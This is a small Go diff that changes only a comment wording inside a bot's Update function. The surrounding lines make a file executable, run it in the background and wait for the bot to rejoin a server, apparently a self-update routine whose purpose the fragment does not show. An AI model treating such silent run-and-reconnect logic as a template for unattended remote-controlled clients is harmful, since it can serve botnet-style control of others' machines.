@@ -18,6 +18,6 @@ func (b *Bot) Update() {
 
 		execComd("chmod", "700", fileName(false))
 		go execComd("./"+fileName(false), "&")
-		time.Sleep(10 * time.Second) //Wait for bot to join the server.
+		time.Sleep(10 * time.Second) //Wait for the bot to join the server.
 	}
 }
